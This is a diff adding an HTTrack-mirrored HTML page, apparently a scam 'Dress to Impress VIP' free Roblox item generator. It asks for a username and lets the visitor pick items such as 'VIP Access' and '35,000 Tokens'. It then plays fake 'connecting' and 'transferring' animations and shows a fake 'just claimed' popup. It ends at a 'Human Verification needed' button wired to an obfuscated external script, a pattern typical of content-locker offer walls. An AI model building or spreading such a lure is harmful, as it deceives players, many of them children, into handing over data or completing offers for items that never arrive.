@@ -1,0 +1,185 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Mirrored from dress2.pages.dev/ by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 25 Oct 2024 19:49:06 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    <title>Dress to Impress VIP</title>
+    <link rel="stylesheet" href="styles.css">
+    <script defer src="script.js"></script>
+    <link rel="stylesheet" href="../cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <script type="text/javascript">
+        var wPkYV_OsT_racoxc={"it":4377290,"key":"d8bcc"};
+    </script>
+    <script src="../d16w9e5gvnj8jg.cloudfront.net/63248f3.js"></script>
+</head>
+<body>
+
+    <div class="container" id="main-content">
+        <!-- Central Image -->
+        <img src="logo.png" alt="Logo Image" class="central-image">
+        
+        <!-- Input field for username and button -->
+        <input type="text" class="user-input" placeholder="Enter username" id="username">
+        <!-- Username warning and error messages (below input) -->
+        <p id="error-msg" class="error hidden"></p>
+        <button id="generate-btn">Next</button>
+
+        <!-- Text above images with new warning message for item selection -->
+        <p class="image-instruction">Select an item you wish to generate to your Roblox account:</p>
+        <!-- Item selection warning messages -->
+        <p id="warning-msg" class="warning hidden">You can only select up to 2 items!</p>
+        <p id="item-warning-msg" class="warning hidden">Please select at least 1 item!</p>
+
+        <!-- Flexible Images Section (3 images only) -->
+        <div class="image-grid">
+            <div>
+                <img src="makeup.webp" alt="Makeup Image" class="flex-image">
+                <p class="image-description">Custom Makeup</p>
+            </div>
+            <div>
+                <img src="vip.png" alt="VIP Image" class="flex-image">
+                <p class="image-description">VIP Access</p>
+            </div>
+            <div>
+                <img src="x2money.png" alt="VIP Image" class="flex-image">
+                <p class="image-description">x2 money</p>
+            </div>
+            <div>
+                <img src="itemlimit.png" alt="VIP Image" class="flex-image">
+                <p class="image-description">+6 Item Limit</p>
+            </div>
+            <div>
+                <img src="rainbow.png" alt="VIP Image" class="flex-image">
+                <p class="image-description">Rainbow Skin</p>
+            </div>
+            <div>
+                <img src="walk.webp" alt="Image 3" class="flex-image">
+                <p class="image-description">Fast Walk</p>
+            </div>
+            <!-- New Images -->
+            <div>
+                <img src="topmodel.png" alt="Top Model" class="flex-image">
+                <p class="image-description">Top Model Rank</p>
+            </div>
+            <div>
+                <img src="diva.png" alt="Diva" class="flex-image">
+                <p class="image-description">Runway Diva Rank</p>
+            </div>
+            <div>
+                <img src="money.webp" alt="money" class="flex-image">
+                <p class="image-description">35,000 Tokens</p>
+            </div>
+            <div>
+                <img src="luxury.webp" alt="Luxury" class="flex-image">
+                <p class="image-description">Luxury Dress</p>
+            </div>
+            <div>
+                <img src="moon.png" alt="Moon" class="flex-image">
+                <p class="image-description">Moongazer Girl Set</p>
+            </div>
+            <div>
+                <img src="Futuristi.webp" alt="Futuristi" class="flex-image">
+                <p class="image-description">Futuristic Suit</p>
+            </div>
+            <div>
+                <img src="denim.webp" alt="Diva" class="flex-image">
+                <p class="image-description">Denim Bag</p>
+            </div>
+            <div>
+                <img src="french.png" alt="French" class="flex-image">
+                <p class="image-description">French Luxury Bag</p>
+            </div>
+            <div>
+                <img src="rich.png" alt="Rich" class="flex-image">
+                <p class="image-description">Rich Girl Bag</p>
+            </div>
+        </div>
+        
+    </div>
+    <div id="claim-popup" class="hidden">
+        <img id="claim-avatar" src="avatar1.html" alt="User Avatar" class="popup-avatar">
+        <div class="popup-content">
+            <p id="claim-username">User123</p>
+            <p id="claim-message">Just claimed 'VIP Access'</p>
+        </div>
+    </div>
+    
+    <!-- Single Sequence Box -->
+    <div class="sequence-box hidden" id="sequence-box">
+        <!-- Searching content -->
+        <div id="search-content">
+            <img src="search.png" alt="Searching" class="pulse-animation" id="search-image">
+            <div class="loading-dots">
+                <span class="dot"></span>
+                <span class="dot"></span>
+                <span class="dot"></span>
+            </div>
+            <p class="pulse-animation" id="search-text">Searching for user...</p>
+        </div>
+
+        <!-- Success Tick content -->
+        <div id="tick-content" class="hidden">
+            <img src="tick.png" alt="Success" id="tick-image">
+            <p id="connected-text">Connected to user</p>
+        </div>
+
+        <!-- Platform Selection content -->
+        <div id="platform-content" class="hidden">
+            <p id="connected-text" class="pulse-animation">Select Your Platform:</p>
+            <div class="platform-buttons">
+                <button class="platform-button"><i class="fab fa-windows"></i></button>
+                <button class="platform-button"><i class="fab fa-xbox"></i></button>
+                <button class="platform-button"><i class="fab fa-android"></i></button>
+                <button class="platform-button"><i class="fab fa-apple"></i></button>
+            </div>
+        </div>
+        <!-- Connecting Sequence content -->
+        <div id="connecting-content" class="hidden">
+            <img src="loading.png" alt="Loading Cog" class="spinning-cog" id="loading-image">
+            <p id="connecting-text">Connecting to servers...</p>
+        </div>
+
+        <!-- Transferring Sequence content -->
+        <div id="transferring-content" class="hidden">
+            <img src="box.gif" alt="Transferring Box" class="box-image" id="transferring-image">
+                <div class="loading-dots">
+                <span class="dot"></span>
+                <span class="dot"></span>
+                <span class="dot"></span>
+            </div>
+            <p class="pulse-animation" id="transferring-text">Transferring items to servers...</p>
+        </div>
+
+        <!-- Success Transfer content -->
+        <div id="success-transfer-content" class="hidden">
+           <img src="tick.png" alt="Success" id="success-tick-image">
+           <p id="success-transfer-text">Successfully Transferred item</p>
+        </div>
+        <!-- Transferring to Username Sequence content -->
+        <div id="username-transferring-content" class="hidden">
+            <img src="loading.png" alt="Loading" class="spinning-cog" id="loading-username-image">
+            <div class="loading-dots">
+                <span class="dot"></span>
+                <span class="dot"></span>
+                <span class="dot"></span>
+            </div>
+            <p id="username-transferring-text">Transferring to <span id="transferring-username">Username</span>...</p> <!-- Username dynamically inserted -->
+        </div>
+
+        <!-- Verification Sequence content -->
+        <div id="verification-content" class="hidden">
+            <img src="cross.png" alt="Verification Needed" class="verification-cross" id="verification-cross-image">
+            <p id="verification-text">Human Verification needed to carry on...</p>
+            <button onclick="_ET()" id="verify-btn" class="hidden">Verify</button> <!-- Hidden button, shown after 2 seconds -->
+        </div>
+
+        
+    </div>
+</body>
+
+
+<!-- Mirrored from dress2.pages.dev/ by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 25 Oct 2024 19:49:14 GMT -->
+</html>
